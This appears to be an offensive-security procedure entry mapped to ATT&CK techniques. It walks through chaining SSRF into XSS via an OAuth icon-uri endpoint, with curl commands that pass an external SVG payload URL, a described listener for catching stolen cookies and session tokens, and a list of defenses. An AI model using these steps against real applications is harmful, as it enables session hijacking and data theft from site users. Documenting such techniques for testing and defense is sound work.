---
id: 0144e725-7755-49c3-877d-8ccef70ad88a
name: Server-Side-Request-Forgery-to-Cross-Site-Scripting-via-Out-of-Band-Output
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:38.107488+00:00'
updated_at: '2023-04-10T20:24:14.773907+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - '[[techniques/JavaScript|T1059.007 - JavaScript]]'
sub_techniques: []
tags:
  - '[[tags/Server-Side Request Forgery]]'
  - '[[tags/SSRF to XSS]]'
commands:
  - '[[commands/curl-test-ssrf-to-xss]]'
platforms:
  - Web
tools: []
validated: true
---

# Server-Side-Request-Forgery-to-Cross-Site-Scripting-via-Out-of-Band-Output

## Summary

This procedure demonstrates how to exploit a Server-Side Request Forgery (SSRF) vulnerability to inject malicious code, leading to Cross-Site Scripting (XSS) execution in a victim's browser. By leveraging out-of-band (OOB) output, the attacker can exfiltrate data from internal services or trigger external interactions, bypassing firewall restrictions and enabling further attacks like data theft or session hijacking.

## Description

Server-Side Request Forgery (SSRF) allows an attacker to manipulate a server into making unauthorized requests to internal or external resources. In this scenario, the vulnerability is present in a parameter that fetches external content, such as an icon URI in an OAuth endpoint. The attacker chains this with an XSS payload hosted on an external site (e.g., a proof-of-concept SVG file containing JavaScript) to execute code in the context of a victim's browser session. The OOB aspect involves the server fetching the malicious resource, which triggers the XSS without direct user interaction on the attacker's side, and any exfiltrated data can be sent to an attacker-controlled server. This technique is particularly effective against web applications with insufficient input validation, such as those using user-supplied URLs for resource loading. The target environment is typically a public-facing web application, like a collaboration platform, where the SSRF endpoint processes OAuth or image requests.

## Requirements

1. Access to the vulnerable web application, typically via a browser or HTTP client like curl.
2. Knowledge of the target's URL structure, particularly endpoints that accept URL parameters for fetching external resources (e.g., OAuth icon-uri).
3. A hosted XSS payload, such as an SVG file with embedded JavaScript on an attacker-controlled domain (e.g., brutelogic.com.br/poc.svg).
4. Ability to monitor incoming requests on the attacker's server for OOB exfiltration.

## Defense

- Implement strict input validation and whitelisting for URL parameters to block arbitrary resource fetching.
- Use Content Security Policy (CSP) headers to restrict script execution and external resource loading.
- Deploy Web Application Firewalls (WAFs) to detect and block SSRF patterns, such as internal IP requests or suspicious URL schemes.
- Monitor application logs and network traffic for anomalous outbound requests to internal services or attacker domains.
- Disable unnecessary server-side fetching features in frameworks and validate OAuth/redirect URIs against trusted lists.

## Objectives

1. Identify and exploit an SSRF-vulnerable endpoint to force the server to fetch a malicious external resource.
2. Trigger XSS execution in the victim's browser context via the fetched resource.
3. Achieve out-of-band data exfiltration by observing interactions from the victim's session on the attacker's server.

## Instructions

### Step 1: Verify Basic SSRF Vulnerability

**Context**: Test the endpoint for SSRF by attempting to fetch a benign external resource. This confirms the server processes user-supplied URLs without restrictions.

**Command** ([[commands/curl-test-basic-ssrf]]):

Use curl to send a request to the vulnerable endpoint with an empty or benign consumerUri parameter.

```bash
curl -X GET "https://target.example.com/plugins/servlet/oauth/users/icon-uri?consumerUri=" -v
```

> This step verifies if the server attempts to process the parameter. Look for server-side errors or delays indicating internal request handling.

### Step 2: Test XSS Payload Accessibility

**Context**: Ensure the external XSS payload is reachable and triggers a simple alert when loaded directly. This isolates the payload functionality before chaining.

Fetch the POC SVG directly to confirm it executes JavaScript.

```bash
curl -X GET "http://brutelogic.com.br/poc.svg" -o poc.svg
```

> Open poc.svg in a browser to verify it pops an alert. The SVG contains embedded JavaScript like <script>alert('XSS')</script>, confirming the payload works.

### Step 3: Chain SSRF with XSS for OOB Execution

**Context**: Inject the XSS payload URL into the SSRF endpoint to force the server to fetch it, triggering XSS in the victim's browser during OAuth or icon loading flows.

**Command** ([[commands/curl-test-ssrf-to-xss]]):
```bash
curl -X GET "https://target.example.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg" -v
```

> This combines SSRF and XSS: The server fetches the SVG, which executes in the browser context, potentially alerting or exfiltrating data OOB to the attacker's server. Monitor your server logs for incoming requests from the victim's session.

### Step 4: Validate OOB Exfiltration

**Context**: Confirm success by checking for executed payloads or exfiltrated data, such as DNS queries or HTTP callbacks from the victim's browser.

Set up a listener (e.g., using netcat or a web server) on your domain to capture OOB interactions.

> Success is indicated by received callbacks containing victim data, like cookies or session tokens, confirming the chain worked.
